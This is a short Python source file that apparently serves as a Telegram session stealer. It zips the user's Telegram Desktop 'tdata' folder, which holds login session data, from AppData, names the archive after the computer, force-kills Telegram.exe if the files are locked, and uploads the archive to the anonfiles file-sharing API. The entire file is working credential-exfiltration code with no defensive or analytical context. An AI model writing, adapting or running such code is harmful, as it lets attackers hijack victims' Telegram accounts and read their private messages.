from shutil import make_archive 
from os import chdir , path , environ , system , getenv
from time import sleep
from requests import post
class MainfinTelegram:
    def __init__(self):
        self.name = getenv("Computername")
    def ar(self):
        paths = path.join(environ["USERPROFILE"],"AppData","Roaming","Telegram Desktop")
        chdir(paths)
        make_archive(f"{self.name}", "zip" , "tdata")
    def urlpars(self,token):
        files = {'file': (f'{self.name}.zip', open(f"{self.name}.zip", 'rb'))}
        url = f'https://api.anonfiles.com/upload?token={str(token)}'
        post(url, files=files)

class TER:
    def __init__(sefl):
        pass 
    def telegramm(self , token):
        telg = MainfinTelegram()
        while 1:
            try:
                telg.ar()
            except PermissionError:
                system("taskkill /IM Telegram.exe /F")
                telg.ar()
            try:
                telg.urlpars(token)
                break
            except Exception as e:
                print(e)
